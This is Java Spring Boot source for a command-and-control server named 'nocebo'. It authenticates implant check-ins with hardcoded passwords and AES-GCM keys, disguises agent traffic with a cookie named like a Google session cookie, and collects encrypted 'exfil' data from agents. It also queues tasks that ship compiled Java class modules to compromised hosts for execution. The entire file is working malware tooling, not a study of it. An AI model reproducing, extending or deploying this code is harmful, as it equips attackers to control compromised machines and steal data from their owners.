package com.nocebo.listener;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.annotation.RequestScope;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.CookieValue;

import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidKeyException;
import java.security.SecureRandom;
import java.security.MessageDigest;

import javax.crypto.IllegalBlockSizeException;

import java.io.File;
import java.io.StringWriter;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Base64;
import java.util.Random;
import java.util.Enumeration;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;

import java.text.SimpleDateFormat;

@SpringBootApplication(exclude = { SecurityAutoConfiguration.class })
public class ListenerApplication {

	public static void main(String[] args) {
		SpringApplication.run(ListenerApplication.class, args);
	}

	@RestController
	class noceboEndpoints
	{
		static noceboApi.security sapi = new noceboApi.security();
		static noceboApi.noceboApiUtil napi = new noceboApi.noceboApiUtil();
		static endpointConfig epc = new endpointConfig();
	
		static class endpointConfig
		{
			static String passwd = "T__+Pmv.REW=u9iXBB-";
			static String userpass = "SiAp++Em=@vBnQo0_";
			static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
			static Hashtable<String,session> sessionTable = new Hashtable();
		}

		

		@PostMapping("/60000")
		String auth(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			session sessionData;
			System.out.println(requestData);


			String currentKey;
			//validate auth first

			if (!epc.sessionTable.keySet().contains(idCookie))
			{
				sessionData = new session();
				sessionData.nonce = idCookie.substring(0,12).replace("-","");
				sessionData.tasks.add(napi.mkTask("autoLib","metadata",idCookie,new String[]{}));
				sessionData.encKey = napi.strand(32);
				currentKey = epc.encKey;
			}
			else
			{
				sessionData = (session) epc.sessionTable.get(idCookie);
				currentKey = sessionData.encKey;
			}

			System.out.println(currentKey);
			System.out.println(sessionData.nonce);
			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
			byte[] decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);


			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));

			if (!xmlParsed.get("aKey").toString().equals(epc.passwd))
			{
				return "nah";	
			}

		
			sessionData.cookie = napi.mkCookie(idCookie, epc.passwd);
			sessionData.lastSeen = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
			
			String newNonce = napi.strand(12);

			String retrDoc = napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, newNonce, sessionData.tasks));

			String retrData = new String(
				Base64.getEncoder().encode(
					sapi.encrypt(
						retrDoc.getBytes(),
						sessionData.nonce.getBytes(),
						currentKey
					)
				)
			);

			sessionData.nonce = newNonce;
			sessionData.tasks = new ArrayList();
			epc.sessionTable.put(idCookie,sessionData);


			return retrData;
		}

		@PostMapping("/60001")
		String data(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			session sessionData;
			System.out.println(requestData);

			if (!epc.sessionTable.keySet().contains(idCookie))
			{
				return "nah";
			}
			else
			{
				sessionData  = (session) epc.sessionTable.get(idCookie);
				if (sessionData.cookie.equals(authCookie))
				{
					return "nah";
				}
			}

			Hashtable xmlParsed = napi.xmlExfilToHashtable(
				new String(
					sapi.decrypt(
						Base64.getUrlDecoder().decode(
							requestData.replace("=","")
						), 
						sessionData.nonce.getBytes(),
						sessionData.encKey
					)
				)
			);
			
			System.out.println(xmlParsed.toString());

			sessionData.data.add(xmlParsed);

			return "ok";
		}

		@PostMapping("/tasking")
		String ctrl(@RequestBody noceboApiCommand requestData, @CookieValue("nocebo.auth") String authCookie) throws IOException
		{
			//put authenticator in front
			if (!epc.sessionTable.keySet().contains(requestData.uuid))
			{
				return "Fatal Error: Invalid session uuid. Agent associated with session ID is most likely dead.";
			}

			session sessionData = (session) epc.sessionTable.get(requestData.uuid);

			Hashtable newTask = napi.mkTask(
				requestData.className,
				requestData.methodName,
				requestData.uuid,
				requestData.args.split(",")
			);

			sessionData.tasks.add(
				newTask
			);

			return String.format("Successfully added task: %s", newTask.toString());
		}

		@RequestMapping("/log")
		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
		String log()
		{
			//put authenticator in front
			ArrayList data = new ArrayList();

			for (int i=0; i<epc.sessionTable.size(); i++)
			{
				session sessionData = epc.sessionTable.get(i);
				Hashtable sessionRepresentative = new Hashtable();

				sessionRepresentative.put("tasks",sessionData.tasks.size());
				sessionRepresentative.put("lastSeen",sessionData.lastSeen);
				sessionRepresentative.put("data",sessionData.data);

				data.add(sessionRepresentative.toString());
			}

			return data.toString();
		}

		//@RequestMapping("/auth")
		//String auth(@RequestBody noceboApiRequest requestData)
		//{

		//}
		class session
		{
			static String cookie = new String();
			static ArrayList tasks = new ArrayList();
			static String lastSeen = new String();
			static ArrayList data = new ArrayList();
			static String encKey = new String();
			static String nonce = new String();
		}
	
	
		static class noceboApiCommand
		{
			//static ArrayList<noceboApiCommand> Data = new ArrayList<noceboApiCommand>();
	
			String className;
			String methodName;
			String args;
			String uuid;
	
			//noceboApiCommand(String className, String methodName, String args, String uuid)
			//{
			//	this.className = className;
			//	this.methodName = methodName;
			//	this.args = args;
			//	this.uuid = uuid;
			//}
		}

	}
}




class noceboApi
{

	@Configuration
	class SecurityConfig
	{
		@Bean
 		SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
			return http
      			.requiresChannel(channel -> 
          			channel.anyRequest().requiresSecure())
      			.authorizeRequests(authorize ->
          			authorize.anyRequest().permitAll())
      			.build();
    	}

	}

	static class noceboApiUtil
	{

		public Hashtable mkTask(String className, String methodName, String uuid, String[] args) throws IOException
		{
			String modPath = String.format("..%sfileroot%scom%snocebo%snCore%s%s.class",File.separator,File.separator,File.separator,File.separator,File.separator,className);
			byte[] fileData = Files.readAllBytes(Paths.get(modPath));
			String modData = new String(Base64.getEncoder().encode(fileData));

			Hashtable taskData = new Hashtable();

			taskData.put("uuid",uuid);
			taskData.put("class",className);
			taskData.put("method",methodName);
			taskData.put("args",String.join(",",args));
			taskData.put("mod",modData);
			

			return taskData;
		}

		public int rngenerator(int min, int max) throws NoSuchAlgorithmException 
		{
			SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
			int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
			return randNum;
		}

		public String strand(int strLen) throws NoSuchAlgorithmException {
			//random string, for nonces and such
			String asciiChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			StringBuilder randStr = new StringBuilder();
			for (int x=0; x<strLen; x++) {
				SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
				randStr.append(asciiChars.charAt(rHandle.nextInt(asciiChars.length())));
			}
			return randStr.toString();
		}

		public String mkCookie(String uuid, String passwd) throws NoSuchAlgorithmException
		{
			String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
			Hashtable cookieMaterialRaw = new Hashtable();

			cookieMaterialRaw.put("tstamp",timeStamp);
			cookieMaterialRaw.put("uuid",uuid);
			cookieMaterialRaw.put("passwd",passwd);
			cookieMaterialRaw.put("randPadding",strand(8));

			MessageDigest digest = MessageDigest.getInstance("SHA-256");
			byte[] encodedHash = digest.digest(
				cookieMaterialRaw.toString().getBytes(StandardCharsets.UTF_8)
			);
			return new String(Base64.getEncoder().encode(encodedHash));
		}

		//<response><nonce data=""></nonce><cookie data=""><key data=""></key></cookie><task class="" method="" args="b64">b64moddata</task></response>
		public Document outputToXmlDoc(String cookie, String encKey, String nonce, ArrayList tasks) throws ParserConfigurationException
		{
			DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
			DocumentBuilder constructor = manufactorum.newDocumentBuilder();

			Document doc = constructor.newDocument();

			Element root = doc.createElement("response");
			doc.appendChild(root);
		
			Element cElement = doc.createElement("cookie");
			cElement.setAttribute("data", cookie);
			root.appendChild(cElement);

			Element kElement = doc.createElement("key");		
			kElement.setAttribute("data", encKey);
			root.appendChild(kElement);
			
			Element nElement = doc.createElement("nonce");		
			nElement.setAttribute("data", nonce);
			root.appendChild(nElement);
			

			//task parsing
			for (int q=0; q<tasks.size(); q++)
			{
				Hashtable taskDescriptor = (Hashtable) tasks.get(q);

				Enumeration<String> k = taskDescriptor.keys();
				Element tElement = doc.createElement("task");

				while (k.hasMoreElements())
				{
					String key = k.nextElement();
					if (key.toString() == "mod")
					{
						tElement.setTextContent(
							taskDescriptor.get(key.toString()).toString()
						);
					}
					else
					{
						tElement.setAttribute(
							key.toString(),
							taskDescriptor.get(key.toString()).toString()
						);
					}
				}
				root.appendChild(tElement);
			}

			return doc;

		}

		public Hashtable xmlExfilToHashtable(String xmlPostData) throws ParserConfigurationException, IOException, SAXException
		{
			//<modname><fieldname data=""></modname>
			Hashtable xmlParsed = new Hashtable();

			DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
			DocumentBuilder constructor = manufactorum.newDocumentBuilder();
			Document doc = constructor.parse(new InputSource(new StringReader(xmlPostData)));

			Element rootElement = doc.getDocumentElement();

			NodeList nl = rootElement.getChildNodes();
			for (int n=0;n<nl.getLength();n++)
			{
				Node nodeData = nl.item(n);
				Element nodeElement = (Element) nodeData;
				xmlParsed.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
			}
			return xmlParsed;
		}

		public String xmlDocToString(Document xmlDoc) throws TransformerException
		{
			TransformerFactory tFacInst = TransformerFactory.newInstance();
			Transformer tFac = tFacInst.newTransformer();
			StringWriter stWrite = new StringWriter();
			tFac.transform(new DOMSource(xmlDoc), new StreamResult(stWrite));
			return stWrite.toString();
		}
	}

	static class security
	{
		//replicates my lycanthropy aesgcm
		public byte[] encrypt(byte[] plaintext, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			SecretKey key = initKey(keyData);
			Cipher cipher = initCipher();

			AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
			cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
			return cipher.doFinal(plaintext);
		}

		public byte[] decrypt(byte[] encrypted, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			SecretKey key = initKey(keyData);
			Cipher cipher = initCipher();

			AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
			cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
			return cipher.doFinal(encrypted);
		}

		private Cipher initCipher() throws Exception
		{
			Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
			return cipher;
		}

		private SecretKey initKey(String encKey) throws Exception
		{
			byte[] keyBytes = encKey.getBytes();
			SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
			return key;
		}
	}
}

